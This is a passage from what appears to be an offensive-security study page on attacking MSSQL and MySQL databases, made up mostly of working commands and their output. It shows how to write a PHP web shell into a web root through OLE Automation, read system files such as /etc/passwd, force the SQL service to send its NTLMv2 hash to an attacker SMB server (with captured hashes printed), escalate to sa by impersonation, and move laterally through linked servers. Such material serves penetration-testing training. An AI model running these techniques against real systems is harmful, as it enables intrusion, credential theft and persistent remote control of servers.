</code></pre></div> <p>To write files using <code>MSSQL</code>, we need to enable <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option" rel="noopener nofollow" target="_blank">Ole Automation Procedures</a>, which requires admin privileges, and then execute some stored procedures to create the file:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a>1&gt; sp_configure 'show advanced options', 1
<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a>2&gt; GO
<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a>3&gt; RECONFIGURE
<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a>4&gt; GO
<a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a>5&gt; sp_configure 'Ole Automation Procedures', 1
<a href="#__codelineno-16-6" id="__codelineno-16-6" name="__codelineno-16-6"></a>6&gt; GO
<a href="#__codelineno-16-7" id="__codelineno-16-7" name="__codelineno-16-7"></a>7&gt; RECONFIGURE
<a href="#__codelineno-16-8" id="__codelineno-16-8" name="__codelineno-16-8"></a>8&gt; GO
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-17-1" id="__codelineno-17-1" name="__codelineno-17-1"></a>1&gt; DECLARE @OLE INT
<a href="#__codelineno-17-2" id="__codelineno-17-2" name="__codelineno-17-2"></a>2&gt; DECLARE @FileID INT
<a href="#__codelineno-17-3" id="__codelineno-17-3" name="__codelineno-17-3"></a>3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
<a href="#__codelineno-17-4" id="__codelineno-17-4" name="__codelineno-17-4"></a>4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
<a href="#__codelineno-17-5" id="__codelineno-17-5" name="__codelineno-17-5"></a>5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
<a href="#__codelineno-17-6" id="__codelineno-17-6" name="__codelineno-17-6"></a>6&gt; EXECUTE sp_OADestroy @FileID
<a href="#__codelineno-17-7" id="__codelineno-17-7" name="__codelineno-17-7"></a>7&gt; EXECUTE sp_OADestroy @OLE
<a href="#__codelineno-17-8" id="__codelineno-17-8" name="__codelineno-17-8"></a>8&gt; GO
</code></pre></div> <hr/> <h3>Read Local Files</h3> <p>By default, <code>MSSQL</code> allows file read on any file in the operating system to which the account has read access. </p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-18-1" id="__codelineno-18-1" name="__codelineno-18-1"></a>1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
<a href="#__codelineno-18-2" id="__codelineno-18-2" name="__codelineno-18-2"></a>2&gt; GO
<a href="#__codelineno-18-3" id="__codelineno-18-3" name="__codelineno-18-3"></a>
<a href="#__codelineno-18-4" id="__codelineno-18-4" name="__codelineno-18-4"></a>BulkColumn
<a href="#__codelineno-18-5" id="__codelineno-18-5" name="__codelineno-18-5"></a>
<a href="#__codelineno-18-6" id="__codelineno-18-6" name="__codelineno-18-6"></a>-----------------------------------------------------------------------------
<a href="#__codelineno-18-7" id="__codelineno-18-7" name="__codelineno-18-7"></a># Copyright (c) 1993-2009 Microsoft Corp.
<a href="#__codelineno-18-8" id="__codelineno-18-8" name="__codelineno-18-8"></a>#
<a href="#__codelineno-18-9" id="__codelineno-18-9" name="__codelineno-18-9"></a># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
<a href="#__codelineno-18-10" id="__codelineno-18-10" name="__codelineno-18-10"></a>#
<a href="#__codelineno-18-11" id="__codelineno-18-11" name="__codelineno-18-11"></a># This file contains the mappings of IP addresses to hostnames. Each
<a href="#__codelineno-18-12" id="__codelineno-18-12" name="__codelineno-18-12"></a># entry should be kept on an individual line. The IP address should
<a href="#__codelineno-18-13" id="__codelineno-18-13" name="__codelineno-18-13"></a>
<a href="#__codelineno-18-14" id="__codelineno-18-14" name="__codelineno-18-14"></a>(1 rows affected)
</code></pre></div> <p>By default a <code>MySQL</code> installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-19-1" id="__codelineno-19-1" name="__codelineno-19-1"></a>mysql&gt; select LOAD_FILE("/etc/passwd");
<a href="#__codelineno-19-2" id="__codelineno-19-2" name="__codelineno-19-2"></a>
<a href="#__codelineno-19-3" id="__codelineno-19-3" name="__codelineno-19-3"></a>+--------------------------+
<a href="#__codelineno-19-4" id="__codelineno-19-4" name="__codelineno-19-4"></a>| LOAD_FILE("/etc/passwd")
<a href="#__codelineno-19-5" id="__codelineno-19-5" name="__codelineno-19-5"></a>+--------------------------------------------------+
<a href="#__codelineno-19-6" id="__codelineno-19-6" name="__codelineno-19-6"></a>root:x:0:0:root:/root:/bin/bash
<a href="#__codelineno-19-7" id="__codelineno-19-7" name="__codelineno-19-7"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<a href="#__codelineno-19-8" id="__codelineno-19-8" name="__codelineno-19-8"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
<a href="#__codelineno-19-9" id="__codelineno-19-9" name="__codelineno-19-9"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
<a href="#__codelineno-19-10" id="__codelineno-19-10" name="__codelineno-19-10"></a>sync:x:4:65534:sync:/bin:/bin/sync
<a href="#__codelineno-19-11" id="__codelineno-19-11" name="__codelineno-19-11"></a>
<a href="#__codelineno-19-12" id="__codelineno-19-12" name="__codelineno-19-12"></a>&lt;SNIP&gt;
</code></pre></div> <hr/> <h3>Capture MSSQL Service Hash</h3> <p>We can also steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p> <p>To make this work, we need first to start <a href="https://github.com/lgandx/Responder" rel="noopener nofollow" target="_blank">Responder</a> or <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener nofollow" target="_blank">impacket-smbserver</a> and execute one of the following SQL queries:</p> <p>XP_DIRTREE Hash Stealing <div class="highlight"><pre><span></span><code><a href="#__codelineno-20-1" id="__codelineno-20-1" name="__codelineno-20-1"></a>1&gt; EXEC master..xp_dirtree '\\10.10.110.17\share\'
<a href="#__codelineno-20-2" id="__codelineno-20-2" name="__codelineno-20-2"></a>2&gt; GO
<a href="#__codelineno-20-3" id="__codelineno-20-3" name="__codelineno-20-3"></a>
<a href="#__codelineno-20-4" id="__codelineno-20-4" name="__codelineno-20-4"></a>subdirectory    depth
<a href="#__codelineno-20-5" id="__codelineno-20-5" name="__codelineno-20-5"></a>--------------- -----------
</code></pre></div></p> <p>XP_SUBDIRS Hash Stealing <div class="highlight"><pre><span></span><code><a href="#__codelineno-21-1" id="__codelineno-21-1" name="__codelineno-21-1"></a>1&gt; EXEC master..xp_subdirs '\\10.10.110.17\share\'
<a href="#__codelineno-21-2" id="__codelineno-21-2" name="__codelineno-21-2"></a>2&gt; GO
<a href="#__codelineno-21-3" id="__codelineno-21-3" name="__codelineno-21-3"></a>
<a href="#__codelineno-21-4" id="__codelineno-21-4" name="__codelineno-21-4"></a>HResult 0x55F6, Level 16, State 1
<a href="#__codelineno-21-5" id="__codelineno-21-5" name="__codelineno-21-5"></a>xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
</code></pre></div></p> <p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p> <p>XP_SUBDIRS Hash Stealing with Responder <div class="highlight"><pre><span></span><code><a href="#__codelineno-22-1" id="__codelineno-22-1" name="__codelineno-22-1"></a>secops@kali[/kali]$ sudo responder -I tun0
<a href="#__codelineno-22-2" id="__codelineno-22-2" name="__codelineno-22-2"></a>
<a href="#__codelineno-22-3" id="__codelineno-22-3" name="__codelineno-22-3"></a>                                         __               
<a href="#__codelineno-22-4" id="__codelineno-22-4" name="__codelineno-22-4"></a>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
<a href="#__codelineno-22-5" id="__codelineno-22-5" name="__codelineno-22-5"></a>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
<a href="#__codelineno-22-6" id="__codelineno-22-6" name="__codelineno-22-6"></a>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
<a href="#__codelineno-22-7" id="__codelineno-22-7" name="__codelineno-22-7"></a>                   |__|              
<a href="#__codelineno-22-8" id="__codelineno-22-8" name="__codelineno-22-8"></a>&lt;SNIP&gt;
<a href="#__codelineno-22-9" id="__codelineno-22-9" name="__codelineno-22-9"></a>
<a href="#__codelineno-22-10" id="__codelineno-22-10" name="__codelineno-22-10"></a>[+] Listening for events...
<a href="#__codelineno-22-11" id="__codelineno-22-11" name="__codelineno-22-11"></a>
<a href="#__codelineno-22-12" id="__codelineno-22-12" name="__codelineno-22-12"></a>[SMB] NTLMv2-SSP Client   : 10.10.110.17
<a href="#__codelineno-22-13" id="__codelineno-22-13" name="__codelineno-22-13"></a>[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
<a href="#__codelineno-22-14" id="__codelineno-22-14" name="__codelineno-22-14"></a>[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
</code></pre></div></p> <p>XP_SUBDIRS Hash Stealing with impacket <div class="highlight"><pre><span></span><code><a href="#__codelineno-23-1" id="__codelineno-23-1" name="__codelineno-23-1"></a>secops@kali[/kali]$ sudo impacket-smbserver share ./ -smb2support
<a href="#__codelineno-23-2" id="__codelineno-23-2" name="__codelineno-23-2"></a>
<a href="#__codelineno-23-3" id="__codelineno-23-3" name="__codelineno-23-3"></a>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
<a href="#__codelineno-23-4" id="__codelineno-23-4" name="__codelineno-23-4"></a>[*] Config file parsed
<a href="#__codelineno-23-5" id="__codelineno-23-5" name="__codelineno-23-5"></a>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<a href="#__codelineno-23-6" id="__codelineno-23-6" name="__codelineno-23-6"></a>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
<a href="#__codelineno-23-7" id="__codelineno-23-7" name="__codelineno-23-7"></a>[*] Config file parsed                                                 
<a href="#__codelineno-23-8" id="__codelineno-23-8" name="__codelineno-23-8"></a>[*] Config file parsed                                                 
<a href="#__codelineno-23-9" id="__codelineno-23-9" name="__codelineno-23-9"></a>[*] Config file parsed
<a href="#__codelineno-23-10" id="__codelineno-23-10" name="__codelineno-23-10"></a>[*] Incoming connection (10.129.203.7,49728)
<a href="#__codelineno-23-11" id="__codelineno-23-11" name="__codelineno-23-11"></a>[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
<a href="#__codelineno-23-12" id="__codelineno-23-12" name="__codelineno-23-12"></a>[*] User WINSRV02\mssqlsvc authenticated successfully                        
<a href="#__codelineno-23-13" id="__codelineno-23-13" name="__codelineno-23-13"></a>[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
<a href="#__codelineno-23-14" id="__codelineno-23-14" name="__codelineno-23-14"></a>[*] Closing down connection (10.129.203.7,49728)                      
<a href="#__codelineno-23-15" id="__codelineno-23-15" name="__codelineno-23-15"></a>[*] Remaining connections []
</code></pre></div></p> <hr/> <h3>Impersonate Existing Users with MSSQL</h3> <p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.</p> <p>First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.</p> <p>Identify Users that We Can Impersonate <div class="highlight"><pre><span></span><code><a href="#__codelineno-24-1" id="__codelineno-24-1" name="__codelineno-24-1"></a>1&gt; SELECT distinct b.name
<a href="#__codelineno-24-2" id="__codelineno-24-2" name="__codelineno-24-2"></a>2&gt; FROM sys.server_permissions a
<a href="#__codelineno-24-3" id="__codelineno-24-3" name="__codelineno-24-3"></a>3&gt; INNER JOIN sys.server_principals b
<a href="#__codelineno-24-4" id="__codelineno-24-4" name="__codelineno-24-4"></a>4&gt; ON a.grantor_principal_id = b.principal_id
<a href="#__codelineno-24-5" id="__codelineno-24-5" name="__codelineno-24-5"></a>5&gt; WHERE a.permission_name = 'IMPERSONATE'
<a href="#__codelineno-24-6" id="__codelineno-24-6" name="__codelineno-24-6"></a>6&gt; GO
<a href="#__codelineno-24-7" id="__codelineno-24-7" name="__codelineno-24-7"></a>
<a href="#__codelineno-24-8" id="__codelineno-24-8" name="__codelineno-24-8"></a>name
<a href="#__codelineno-24-9" id="__codelineno-24-9" name="__codelineno-24-9"></a>-----------------------------------------------
<a href="#__codelineno-24-10" id="__codelineno-24-10" name="__codelineno-24-10"></a>sa
<a href="#__codelineno-24-11" id="__codelineno-24-11" name="__codelineno-24-11"></a>ben
<a href="#__codelineno-24-12" id="__codelineno-24-12" name="__codelineno-24-12"></a>valentin
<a href="#__codelineno-24-13" id="__codelineno-24-13" name="__codelineno-24-13"></a>
<a href="#__codelineno-24-14" id="__codelineno-24-14" name="__codelineno-24-14"></a>(3 rows affected)
</code></pre></div></p> <p>To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role: <div class="highlight"><pre><span></span><code><a href="#__codelineno-25-1" id="__codelineno-25-1" name="__codelineno-25-1"></a>1&gt; SELECT SYSTEM_USER
<a href="#__codelineno-25-2" id="__codelineno-25-2" name="__codelineno-25-2"></a>2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
<a href="#__codelineno-25-3" id="__codelineno-25-3" name="__codelineno-25-3"></a>3&gt; go
<a href="#__codelineno-25-4" id="__codelineno-25-4" name="__codelineno-25-4"></a>
<a href="#__codelineno-25-5" id="__codelineno-25-5" name="__codelineno-25-5"></a>-----------
<a href="#__codelineno-25-6" id="__codelineno-25-6" name="__codelineno-25-6"></a>julio                                                                                                                    
<a href="#__codelineno-25-7" id="__codelineno-25-7" name="__codelineno-25-7"></a>
<a href="#__codelineno-25-8" id="__codelineno-25-8" name="__codelineno-25-8"></a>(1 rows affected)
<a href="#__codelineno-25-9" id="__codelineno-25-9" name="__codelineno-25-9"></a>
<a href="#__codelineno-25-10" id="__codelineno-25-10" name="__codelineno-25-10"></a>-----------
<a href="#__codelineno-25-11" id="__codelineno-25-11" name="__codelineno-25-11"></a>          0
<a href="#__codelineno-25-12" id="__codelineno-25-12" name="__codelineno-25-12"></a>
<a href="#__codelineno-25-13" id="__codelineno-25-13" name="__codelineno-25-13"></a>(1 rows affected)
</code></pre></div></p> <p>As the returned value <code>0</code> indicates, we do not have the sysadmin role, but we can impersonate the <code>sa</code> user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement <code>EXECUTE AS LOGIN</code> and set it to the user we want to impersonate.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-26-1" id="__codelineno-26-1" name="__codelineno-26-1"></a>1&gt; EXECUTE AS LOGIN = 'sa'
<a href="#__codelineno-26-2" id="__codelineno-26-2" name="__codelineno-26-2"></a>2&gt; SELECT SYSTEM_USER
<a href="#__codelineno-26-3" id="__codelineno-26-3" name="__codelineno-26-3"></a>3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
<a href="#__codelineno-26-4" id="__codelineno-26-4" name="__codelineno-26-4"></a>4&gt; GO
<a href="#__codelineno-26-5" id="__codelineno-26-5" name="__codelineno-26-5"></a>
<a href="#__codelineno-26-6" id="__codelineno-26-6" name="__codelineno-26-6"></a>-----------
<a href="#__codelineno-26-7" id="__codelineno-26-7" name="__codelineno-26-7"></a>sa
<a href="#__codelineno-26-8" id="__codelineno-26-8" name="__codelineno-26-8"></a>
<a href="#__codelineno-26-9" id="__codelineno-26-9" name="__codelineno-26-9"></a>(1 rows affected)
<a href="#__codelineno-26-10" id="__codelineno-26-10" name="__codelineno-26-10"></a>
<a href="#__codelineno-26-11" id="__codelineno-26-11" name="__codelineno-26-11"></a>-----------
<a href="#__codelineno-26-12" id="__codelineno-26-12" name="__codelineno-26-12"></a>          1
<a href="#__codelineno-26-13" id="__codelineno-26-13" name="__codelineno-26-13"></a>
<a href="#__codelineno-26-14" id="__codelineno-26-14" name="__codelineno-26-14"></a>(1 rows affected)
</code></pre></div> <blockquote> <p><b>Note:</b> It's recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using <code>USE master</code>.</p> </blockquote> <p>We can now execute any command as a sysadmin as the returned value <code>1</code> indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement <code>REVERT</code>.</p> <blockquote> <p><strong>Note</strong>: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.</p> </blockquote> <hr/> <h3>Communicate with Other Databases with MSSQL</h3> <p><code>MSSQL</code> has a configuration option called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine" rel="noopener nofollow" target="_blank">linked servers</a>. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p> <p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.</p> <p>Identify linked Servers in MSSQL <div class="highlight"><pre><span></span><code><a href="#__codelineno-27-1" id="__codelineno-27-1" name="__codelineno-27-1"></a>1&gt; SELECT srvname, isremote FROM sysservers
<a href="#__codelineno-27-2" id="__codelineno-27-2" name="__codelineno-27-2"></a>2&gt; GO
<a href="#__codelineno-27-3" id="__codelineno-27-3" name="__codelineno-27-3"></a>
<a href="#__codelineno-27-4" id="__codelineno-27-4" name="__codelineno-27-4"></a>srvname                             isremote
<a href="#__codelineno-27-5" id="__codelineno-27-5" name="__codelineno-27-5"></a>----------------------------------- --------
<a href="#__codelineno-27-6" id="__codelineno-27-6" name="__codelineno-27-6"></a>DESKTOP-MFERMN4\SQLEXPRESS          1
<a href="#__codelineno-27-7" id="__codelineno-27-7" name="__codelineno-27-7"></a>10.0.0.12\SQLEXPRESS                0
<a href="#__codelineno-27-8" id="__codelineno-27-8" name="__codelineno-27-8"></a>
<a href="#__codelineno-27-9" id="__codelineno-27-9" name="__codelineno-27-9"></a>(2 rows affected)
</code></pre></div></p> <p>As we can see in the query's output, we have the name of the server and the column <code>isremote</code>, where <code>1</code> means is a remote server, and <code>0</code> is a linked server.</p> <p>Next, we can attempt to identify the user used for the connection and its privileges. <div class="highlight"><pre><span></span><code><a href="#__codelineno-28-1" id="__codelineno-28-1" name="__codelineno-28-1"></a>1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
<a href="#__codelineno-28-2" id="__codelineno-28-2" name="__codelineno-28-2"></a>2&gt; GO
<a href="#__codelineno-28-3" id="__codelineno-28-3" name="__codelineno-28-3"></a>
<a href="#__codelineno-28-4" id="__codelineno-28-4" name="__codelineno-28-4"></a>------------------------------ ------------------------------ ------------------------------ -----------
<a href="#__codelineno-28-5" id="__codelineno-28-5" name="__codelineno-28-5"></a>DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
<a href="#__codelineno-28-6" id="__codelineno-28-6" name="__codelineno-28-6"></a>
<a href="#__codelineno-28-7" id="__codelineno-28-7" name="__codelineno-28-7"></a>(1 rows affected)
</code></pre></div></p> <blockquote> <p><strong>Note</strong>: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p> </blockquote> <p>We can now execute queries with sysadmin privileges on the linked server. As <code>sysadmin</code>, we control the SQL Server instance. We can read data from any database or execute system commands with <code>xp_cmdshell</code>.</p> </article> </div> <script>var input,hash=location.hash.slice(1);hash.startsWith("__tabbed_")&&((input=document.getElementById(hash)).checked=!0)</script> </div> <a class="md-top md-icon" data-md-component="top" hidden="" href="#"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"></path></svg> Back to top </a> </main> <footer class="md-footer"> <nav aria-label="Footer" class="md-footer__inner md-grid"> <a aria-label="Previous: SMB" class="md-footer__link md-footer__link--prev" href="../attacking_smb/" rel="prev"> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg> </div> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Previous </span> SMB </div> </div> </a> <a aria-label="Next: RDP" class="md-footer__link md-footer__link--next" href="../attacking_rdp/" rel="next"> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Next </span> RDP </div> </div> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"></path></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class="md-copyright"> <div class="md-copyright__highlight"> Copyright  2021 - 2022 Neutron Security </div> </div> <div class="md-social"> <a class="md-social__link" href="https://github.com/neutronsec" rel="noopener" target="_blank" title="github.com"> <svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg> </a> <a class="md-social__link" href="https://twitter.com/neutronctf" rel="noopener" target="_blank" title="twitter.com"> <svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg> </a> <a class="md-social__link" href="https://secops.cc" rel="noopener" target="_blank" title="secops.cc"> <svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg> </a> <a class="md-social__link" href="mailto:hello@neutronsec.com" rel="noopener" target="_blank" title=""> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2m-3 13H7v-2h10m0-2H7v-2h10m3-2h-3V6h3"></path></svg> </a> </div> </div> </div> </footer> </div> <div class="md-dialog" data-md-component="dialog"> <div class="md-dialog__inner md-typeset"></div> </div> <script id="__config" type="application/json">{"base": "../..", "features": ["announce.dismiss", "content.code.annotate", "content.tooltips", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow", "toc.integrate"], "search": "../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src="../../assets/javascripts/bundle.d36b1844.min.js"></script> <script>const lightbox = GLightbox({"touchNavigation": true, "loop": false, "width": "100%", "height": "auto", "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom"});</script></body> </html>